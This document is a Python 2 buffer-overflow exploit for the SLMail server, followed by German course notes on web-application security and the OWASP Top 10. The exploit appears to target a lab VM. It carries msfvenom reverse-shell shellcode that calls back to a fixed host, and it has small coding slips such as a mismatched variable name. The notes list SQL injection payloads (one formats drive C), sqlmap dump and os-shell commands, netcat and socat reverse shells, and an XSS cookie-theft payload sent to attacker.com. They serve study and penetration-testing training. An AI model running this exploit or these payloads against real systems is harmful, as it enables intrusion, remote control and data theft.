        buffer='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'
        connect_to_SLMail(ip, buffer)

    def check_values_attack_input(ip):
        """Checking if EIP is filled with captial 'B' letters"""
        buffer="A"*2606 + "B"*4 + "C"*90
        connect_to_SLMail(ip, buffer)

    def determine_bad_characters(ip):
        # All hex characters:
        badchars=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
              "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
              "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
              "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
              "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
              "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
              "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
              "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
              "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
              "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
              "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
              "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
              "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
              "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
              "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

        # All acceptable hex characters (\x00, \x0a and \x0d have been removed):
    #    badchars=("x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
    #          "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    #          "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    #          "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    #          "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    #          "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    #          "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    #          "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    #          "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    #          "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    #          "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    #          "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    #          "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    #          "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    #          "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

        buffer='A'*2606 + 'B'*4 + bad_chars + 'C'*(3500-2606-4-255)
        connect_to_SLMail(ip, buffer)

    def attack_with_payload(ip):
        """Use a reverse shell payload generated by msfvenom such that victim connects reverse shell to port 443 on 192.168.64.137"""
    #   Determine opcode of 'JMP ESP' using
    #      /usr/share/metasploit-framework/tools/exploit/nasm_shell
    #
    #   Opcode is FFE4
    #
    #  Search for this opcode in the whole slmfc.dll using mona in ImmunityDebugger:
    #      !mona find -s '\xff\xe4' -m slmfc.dll
    #
    #  A suitable address without bad characters is:
    #      5F4A358F
    #
    #  Veriying that this address really holds the "JMP ESP" instruction
    #  using the debuggers button for "Go to address in disassembler"
    #
    #  slmfc is a suitable module, since it is statically loaded to the same memory address
    #  and is not protected (No DEP, no ASLR, no NX). This can be confirmed by:
    #     !mona modules
    #
    # Generate reverse shell payload using:
    #    /usr/share/metasploit-framework/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.64.137 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
    #

        # Address has to be defined in reverse order because of little endian encoding:
        address_of_jmp_esp = '\x8F\x35\x4a\x5F'
        reverse_shell_code = ("\xbb\x4c\xd1\x2d\x04\xdb\xc9\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
                              "\x52\x31\x58\x12\x03\x58\x12\x83\x8c\xd5\xcf\xf1\xf0\x3e\x8d"
                              "\xfa\x08\xbf\xf2\x73\xed\x8e\x32\xe7\x66\xa0\x82\x63\x2a\x4d"
                              "\x68\x21\xde\xc6\x1c\xee\xd1\x6f\xaa\xc8\xdc\x70\x87\x29\x7f"
                              "\xf3\xda\x7d\x5f\xca\x14\x70\x9e\x0b\x48\x79\xf2\xc4\x06\x2c"
                              "\xe2\x61\x52\xed\x89\x3a\x72\x75\x6e\x8a\x75\x54\x21\x80\x2f"
                              "\x76\xc0\x45\x44\x3f\xda\x8a\x61\x89\x51\x78\x1d\x08\xb3\xb0"
                              "\xde\xa7\xfa\x7c\x2d\xb9\x3b\xba\xce\xcc\x35\xb8\x73\xd7\x82"
                              "\xc2\xaf\x52\x10\x64\x3b\xc4\xfc\x94\xe8\x93\x77\x9a\x45\xd7"
                              "\xdf\xbf\x58\x34\x54\xbb\xd1\xbb\xba\x4d\xa1\x9f\x1e\x15\x71"
                              "\x81\x07\xf3\xd4\xbe\x57\x5c\x88\x1a\x1c\x71\xdd\x16\x7f\x1e"
                              "\x12\x1b\x7f\xde\x3c\x2c\x0c\xec\xe3\x86\x9a\x5c\x6b\x01\x5d"
                              "\xa2\x46\xf5\xf1\x5d\x69\x06\xd8\x99\x3d\x56\x72\x0b\x3e\x3d"
                              "\x82\xb4\xeb\x92\xd2\x1a\x44\x53\x82\xda\x34\x3b\xc8\xd4\x6b"
                              "\x5b\xf3\x3e\x04\xf6\x0e\xa9\xeb\xaf\x50\xa0\x84\xad\x50\xb3"
                              "\xef\x3b\xb6\xd9\x1f\x6a\x61\x76\xb9\x37\xf9\xe7\x46\xe2\x84"
                              "\x28\xcc\x01\x79\xe6\x25\x6f\x69\x9f\xc5\x3a\xd3\x36\xd9\x90"
                              "\x7b\xd4\x48\x7f\x7b\x93\x70\x28\x2c\xf4\x47\x21\xb8\xe8\xfe"
                              "\x9b\xde\xf0\x67\xe3\x5a\x2f\x54\xea\x63\xa2\xe0\xc8\x73\x7a"
                              "\xe8\x54\x27\xd2\xbf\x02\x91\x94\x69\xe5\x4b\x4f\xc5\xaf\x1b"
                              "\x16\x25\x70\x5d\x17\x60\x06\x81\xa6\xdd\x5f\xbe\x07\x8a\x57"
                              "\xc7\x75\x2a\x97\x12\x3e\x4a\x7a\xb6\x4b\xe3\x23\x53\xf6\x6e"
                              "\xd4\x8e\x35\x97\x57\x3a\xc6\x6c\x47\x4f\xc3\x29\xcf\xbc\xb9"
                              "\x22\xba\xc2\x6e\x42\xef")
        # To avoid overwriting of the shellcode when it is decoded,
        # 16 NOPs (opcode \x90) have to be inserted at the orginial position
        # of the payload (address where ESP points to).
        buffer='A'*2606 + address_of_jmp_esp + '\x90'*16 + reverse_shell_code + 'C'*(3500-2606-4-351-16)
        print "Attacking SLMail with reverse shell payload"
        connect_to_SLMail(ip, buffer)

    if __name__ == "__main__":

        import sys
        ERR_MISSING_ARGUMENT = 1
        ERR_INVALID_FORMAT = 2
        ERR_INVALID_VALUES = 3

        if (len(sys.argv)) != 2:
            print("Usage: {} IPv4-address".format(sys.argv[0]))
            sys.exit(ERR_MISSING_ARGUMENT)

        ip = sys.argv[1]
        octets = ip.split('.')
        if (len(octets) != 4):
            print "Invalid format of IP address"
            sys.exit(ERR_INVALID_FORMAT)

        for o in octets:
            try:
                num = int(o)
            except:
                print "Invalid values in IP address"
                sys.exit(ERR_INVALID_VALUES)

            if (num < 0) or (num > 255):
                print "Invalid values in IP address"
                sys.exit(ERR_INVALID_VALUES)

        ip = octets[0] + '.' + octets[1] + '.' + octets[2] + '.' + octets[3]

        print "Attacking IP " + ip

        # Win7 local VM to attack:
        # ip = 192.168.64.135

    #   Fuzzing the SLMail server to find vulnerability
    #    fuzz(ip)

    #   Replicate the crash using a string with suitable length
    #    replicate_crash(ip)

    #   Send unique string to determine position of input on victim machine:
    #    attack_with_unique_string(ip)

    #   Determine which characters result in a truncation of the input in the memory of the victim machine
    #    determine_bad_characters(ip)

    #   Attack victim machine with reverse shell payload:
        attack_with_payload(ip)

Aufgabe 4: Thema Sicherheit von Web-Anwendungen (4+4+3+2 = 13 Punkte)

Evaluation verschiedener Schutzmechanismen

Firewalls verhindern keine Angriffe über erlaubte Ports

Beispiel: Angriffe gegen eine Web-Anwendung über das HTTP-Protokoll und
TCP-Ports 80/443

Verschlüsselung sichert Integrität der übertragenen Daten, damit werden
aber auch Angriffe “sicher” zum Zielsystem übertragen

Beispiel: Verhindern keine Angriffe gegen Serversysteme auf
Anwendungsebene

Frameworks vermeiden Schwachstellen, da sie gut getestet sind, aber sind
ein Risiko für den Datenschutz und können Fehler über dependencies
einschleusen

Beispiel: Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter
protokolliert - Laden viele Pakete nach

Angriffsziele

-   Applikationen, e.g. Web-Applikationen oder Datenbanken
-   Dienste, e.g. Webserver, Applikationsserver
-   Betriebssysteme, e.g. Windows, Linux
-   Netzwerk, e.g. ARP, IP, TCP, UDP

OWASP Top 10 Übersicht

[OWASP Top 10]

A1: Fehlerhafte Berechtigungsprüfung

-   Prüfung von Zugriffsberechtigungen fehlt oder ist fehlerhaft

-   Beispiele

    -   Verletzung des Prinzips des kleinsten Privilegs bzw. der
        Zugriffsverweigeruns als Standardeinstellung
    -   Umgehen der Berechtigungsprüfung durch verändern der URL
    -   Unsichere direkte Objektreferenz
    -   Zugriff auf eine API ohne POST PUT und DELETE
        Berechtigungsprüfung
    -   Erweiterung der Rechte
        -   Zugriff als normaler Benutzer möglich, ohne am System
            angemeldet zu sein
    -   Manipulation von Metadaten wie e.g. erneutes Senden JWT Access
        Control Tokens, eines Cookies oder eines versteckten
        Formularfeldes
    -   Fehlerkonfiguration von CORS

-   Auswirkungen

    -   Angreifer haben mehr Rechte, als ihnen eigentlich zustehen
        würden
    -   Offenlegung von Informationen

-   Angriffsszenario (Unsichere direkte Objektreferenz)

    -   Bedrohung: Benutzer kann den Namen oder die ID eines Objektes
        verwenden um direkten Zugriff zu erhalten, ohne dass die
        Berechtigungen des Benutzers überprüft werden
    -   Ursachen: Fehlende Berechtigungsprüfung für alle Objektzugriffe
        (Entwurfsprinzip der “Vollständigen Vermittlung”)
    -   Verwendung direkter Referenzen auf Objekte

-   Beispiel

        String query = "SELECT * FROM accts WHERE account = ?";
        PreparedStatement pstmt = connection.preparedStatement(query, ...);
        pstmt.setString(1, request.getParameter("acct"));
        ResultSetresults = pstmt.executeQuery();

    Dies kann folgendermaßen ausgenutzt werden:

        https://example.com/app/accountInfo?acct=notmyacct

-   Maßnahmen

    -   Berechtigungsprüfung ist nur effektiv, wenn diese in
        vertrauenswürdigem Kontext durchgeführt wird, in welchem die
        Metadaten von Angreifern nicht modifiziert werden kann
    -   Standardmäßig Zugriff verbieten
    -   Verwendung inderekter Referenzen
        -   d.h. einer Abbildung ovn beliebigen evtl. zufälligen Zahlen
            auf die tatsächlichen Objektreferenzen
    -   Nur eine Komponente zur Berechtingungsprüfung verwenden und
        diese wiederverwenden
    -   Feingranulare Berechtigungsprüfung für jeden Objektzugriff
        implementieren
        -   Beispiel: Benutzer darf nur auf eigene Datenbank zugreifen
    -   Domänenmodelle sollten eindeutige Anforderung in Bezug auf
        Grenzen der Anwendungslogik erzwingen
    -   Web Server Directory Listing deaktivieren
    -   Metadaten und Backup-Dateien nicht in Web-Server-Verzeichnissen
        speichern
    -   Zugriffe, die von der Berechtigungsprüfung abgewiesen wurden,
        protokollieren und Admins bei wiederholtem Auftreten
        benachrichten
    -   Frequenz der Zugriffe auf APIs und Controller beschränken, um
        Schäden durch automatisierte Anfragen einzudämmen
    -   Zustandsbehaftete Sitzungs-IDs (session IDs) nach dem Logout auf
        dem Server als ungültig markieren
    -   Berechtigungsprüfung ausgiebig durch Funktions- und
        Integrationstest testen

A2: Fehlerhafte Kryptographie

-   Es werden keine kryptographische Verfahren verwendet
-   Es werden fehlerhafte, schwache oder nicht mehr sichere
    kryptographische Verfahren oder Implementierung verwendet
-   Beispiel
    -   HTTP, FTP, telnet
    -   DES, 3DES
    -   Passwörter im Klartext speichern
-   Was wird angegriffen?
    -   Passwörter
    -   Schlüssel
    -   Session IDs
-   Angriffspunkte
    -   Festplatten
    -   Hauptspeicher
    -   Übertragung im Netzwerk
-   Angegriffene Anwendungen
    -   Datenbanken
    -   Browser
-   Angriffsszenarien
    -   Kreditkartennummer werden in einer Datenbank verschlüsselt
        gespeichert
    -   Angreifer können die Kreditkartennummern dann durch eine
        SQL-Injektion direkt im Klartext aus der Datenbank abfragen
    -   Eine Web-Anwendung erzwingt die Verwendung von TLS nicht
-   Maßnahmen
    -   Schutzbedarf der zu speichernden ermitteln
    -   Klassifizieren nach Sensibilität
    -   Sensible Daten nicht unnötig speichern
    -   Netzwerkverkehr auf unsichere Protokolle prüfen
    -   Verschlüsselung aller sensiblen Daten
    -   Starke Hash-Funktion mit Salt
    -   Deaktivieren von Caching

A3: Injektionen

-   Eine Anwendung ist verwundbar gegen eine Injektionsangriff, wenn sie
    -   Daten, die von Benutzern geliefert werden, nicht validiert,
        filtert oder bereinigt
    -   Direkt interpretierte statements ohne “escaped” zu werden
    -   Feindselige Daten in den Suchparametern von ORM verwendet
    -   Feindselige Daten diret verwendet oder verkettet
-   Bedrohung
    -   Angreifer manipulieren Anfragen, um unerwünschte Aktionen
        durchzuführen, Informationen zu gewinnen oder Daten zu
        manipulieren
-   Hauptursache
    -   Anwendung übernimmt Benutzereingaben ohne Validierung, Filterung
        oder Bereinigung
-   Auswirkung
    -   Auslesen und Manipulation von Datenbankinhalten
    -   Umgehen der Authentifizierung
    -   Vollständige Kompromittierung des Systems

SQL-Injection

Example: Admin-Login

    http://site.com/login.cgi?user=admin'--&password=secret

    SELECT * FROM user WHERE user='admin'--' and password='secret'

Example: Benutzer zum Admin machen

Erwarterter Aufruf:

    http://site.com/find.cgi?id=42

Erzeugtes SQL:

    SELECT author, subject, text FROM articles WHERE id=42

Aufruf durch Angreifer:

    http://site.com/find.cgi?id=42;UPDATE%20USER%20SET%20TYPE="admin"%20WHERE%20id=13

Erzeugtes SQL:

    SELECT author, subject, text FROM articles WHERE id=42; UPDATE USER SET TYPE="admin" WHERE id=13

Example: Ausführen eines Kommandos auf Microsoft SQL Servern

Erwarteter Aufruf:

    http://site.com/find.cgi?search=something

Erzeugtes SQL:

    SELECT author, subject, text FROM articles WHERE search LIKE `%something`

Aufruf durch Angreifer:

    http://site.com/find.cgi?search=something';GO+EXEC+cmdshell('format+C')+--

Erzeugtes SQL:

    SELECT author, subject, text FROM articles WHERE search LIKE '%something'; GO EXEC cmdshell('format C') --%'

Example: SQL-Injektion durch blindes Vertrauen in Frameworks, z.B.
Hibernate Query Language (HQL)

    Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");

Erwarteter Aufruf:

    http://site.com/accountView?id=1

Aufruf durch Angreifer:

    http://site.com/accountView?id=' or '1'='1

Blind SQL-Injection

-   Bei Blind SQL-Injections bekommt man keine Fehlermeldungen angezeigt

-   Lediglich zwei Zustände können anhand der Ergebnisseite
    unterschieden werden

-   Erzeugen von Wahr/Falschaussagen

        WHERE id='$id' and ASCII(SUBSTRING(SYSTEM_USER,1,1)) = 65

-   Dieser Prozess kann mit sqlmap automatisiert werden

    sqlmap -u http://192.168.1.42 --crawl=1

Crawl gibt die Tiefe an bis zu der Hyperlinks verfolgt werden sollen.

Sämtliche mögliche Daten aus der Datenbank über verwundene Parameter
auslesen:

    sqlmap -u http://192.168.1.42/aktion.php?4711 --dbms=mysql --dump --threads=5

dump sorgt für Auslesen der Daten. threads gibt an mit wie vielen
Threads gleichzeitig sqlmap arbeiten soll.

    sqlmap -u http://192.168.1.42/aktion.php?4711 --dbms=mysql --os-shell

    --dbs # Datenbanken auf dem Zielsystem auflisten
    --batch # Keine Interaktionen mit dem Nutzer
    --level=<LEVEL> # Testtiefe, LEVEL kann die Werte 1 bis 5
    --risk=RISK # Risikostufe der durchzuführenden Tests; RISK kann die Werte 1 bis 3 haben
    --identify-waf # Web Applications Firewall identifizieren
    --tamper=SCRIPT # Web Application Firewall umgehen, e.g --tamper=apostrophemask, apostrophenullencode
    --dbms=DBMS # Datenbanksystem nicht automatisch identifizieren, sondern die Angabe von DBMS verwenden
    --all # Alle mögliche Informationen automatisch ermitteln, e.g. Datenbank mit Version, Standardtabellen, -splaten, -benutzen etc.

Typisches Vorgehen

-   Request mit BURP-Suite abfangen und in Datei abspeichern

SQL-Injection-Demos

    Demo #1: SQL-Injection
    Provozieren einer Fehlermeldung
    '

    Auslesen der Datenbankversion
    1' UNION SELECT @@version; #
    1' UNION SELECT null,@@version; #

    Auslesen der Tabellen/Spalten:
    ' UNION SELECT table_schema,table_name FROM information_schema.tables;#
    ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users';#

    Auslesen der Benutzertabelle:
    ' UNION SELECT user,password FROM users;#

    Auslesen von Dateien:
    ' UNION SELECT null,LOAD_FILE('/etc/passwd');#
    1' UNION SELECT null,LOAD_FILE('/etc/passwd');#

    Demo mit sqlmap:
    sqlmap -u "http://opfer/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=6tifu4kbh73mve4auu75gq0133" -p id --string="Surname"

    Mögliche Optionen:
    -f, --current-db, -D dva tables, -D dvwa -T users --dump

    Demo #2: Blind-SQL-Injection
    Demo mit sqlmap:
    sqlmap -u "http://opfer/dvwa/vulnerabilities/sqli_blind/index.php?id=1&Submit=submit" --cookie="security=low;PHPSESSID=6tifu4kbh73mve4auu75gq0133" -p id --string=Surname

    Mögliche Optionen:
    -f, -b, --current-user,--dbs, -D dvwa tables, -D dvwa -T users --dump

DVWA

Low-Level

    'OR '1' = '1' UNION ALL SELECT first_name, password FROM users;#
    'OR '1' = '1' UNION ALL SELECT version(), user();#

    ?id=a'%20UNION%20SELECT%20first_name,%20password%20FROM%20users;--%20-&Submit=Submit

Medium-Level

Escape String but not having quotes around parameter

    ?id=a%20UNION%20SELECT%20first_name,%20password%20FROM%20users;--%20-&Submit=Submit

Gegenmaßnahmen

-   Direkten Aufruf von Interpretern möglichst vermeiden

-   Falls Aufruf eines Interpreter unvermeidbar, dann sichere APIs
    verwenden

-   Verwende Prepared Statements (e.g. in Java mit JDBC)

        PreparedStatement pstmt = con.prepareStatemnt("SELECT * FROM users WHERE user=? and password=?");
        pstmt.setString(1, username);
        pstmt.setString(2, password);

-   PHP Data Objects

-   Bei dynamischen Abfragen Strings escapen

-   LIMIT verwenden, damit nicht Massenhaft Datensätze entnommen werden
    können

-   Web Application Firewalls e.g. heruasfiltern gefählicher Zeichen wie
    e.g.  " ’ oder ;

-   Durchgängige Server-seitige Eingabevalidierung

-   Nur tatsächlich erforderliche Rechte für Datenbankbenutzer

Command Injection

Einschleusen von Befehlen, die direkt vom Betriebssystem verarbeitet
werden.

Um zu prüfen, welche der Anwendungen installiert ist, kann which
verwendet werden e.g. which socat.

Netcat:

    nc -lnvp 4242 # Listener
    ;nc -e /bin/sh 10.0.0.1 4242 # Victim

Socat:

    socat -dd TCP4-LISTEN:4443 STDOUT # Listener
    ;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash

Cross-Site Scripting (XSS)

Einschleusen von “schadhaftem” Skriptcode in den Browser des Opfers.
Charakteristisch ist, dass der Schadcode im Kontext und mit
Zugriffsrechten des Opfers ausgeführt wird.

Reflektiertes XSS

Benutzereingabe wird vom Server direkt zurückgegeben

-   Skriptcode wird im Browser des Opfers interpretiert

Normaler Aufruf:

    http://searchengine.com?query=Suchbegriff

    Sie suchten nach: Suchbegriff

Angriff:

    http://searchengine.com?query=
    <script">alert("XSS")</script>

    Sie suchten nach: <sript ...>...</script>

Persistentes Cross-Site Scripting

Skriptcode wird dauerhaft innerhalb der Anwendung gespeichert (z.B. bei
Foren, Gästebüchern, MySpace)

-   Code wird in einer Datenbank gespeichert und bei jedem Aufruf wieder
    ausgegeben
-   Der Skriptcode wird anschließend unbemerkt im Browser des Anwenders
    ausgeführt

Angriff:

-   Gästebuch zeigt Einträge auf Website an
-   Schadcode kann über URL oder Formulare eingefügt werden

    http://guestbook.com?entry=Tolle%20Seite!<script>
    alert("XSS")</script>

Ergebnis:

    Tolle Seite!<script">alert("XSS")</script>

Lokales (DOM-basiertes) Cross-Site Scripting

Beispiel:

    <h1>Welcome!</h1>
    Hi
    <script>
      var pos = document.URL.indexOf("name=") + 5;
      document.write(document.URL.substring(pos, document.URL.length));
    </script>
    
    Welcome to our system...

Normaler Aufruf:

    http://site.com/welcome.html?name=John

Angriff:

    http://site.com/welcome.html#name=John<script>
    alert("XSS")</script>

-   # zeigt dem Browser an, dass nachfolgende Zeichen ein Fragment sind,
    d.h. der Parameter wird nicht an den Server übertragen und dort
    nicht geprüft werden.
-   Angriff funktioniert nicht, wenn der Browser bereits URL-Kodierung
    verwendet, d.h. < und > durch %3C und %3E ersetzt

Session Hijacking mit XSS

-   Fehlerhafter Servlet-Code

        (String) page += "<input name='creditcard'
        type='TEXT' value='" + request.getParameter("CC") +
        "'>";

-   Angriff durch Angabe des folgendes Werts für CC:

        '><script>document.location='http://www.attacker.com
        /cgi-bin/cookie.cgi?
        foo='+document.cookie</script>'

Ergebnis:

-   Angreifer erhält Cookie des Benutzers
-   Im Cookie ist i.d.R. die Session ID gespeichert

Gegenmaßnahmen

-   Client- und Server-seitige Eingabevalidierung
    -   Prüfe alle Eingabedaten bevor sie zur Speicherung akzeptiert
        oder angezeigt werden
    -   Prüfung auf Länge, Typ, Wertebereich, Syntax oder
        Geschäftsregeln
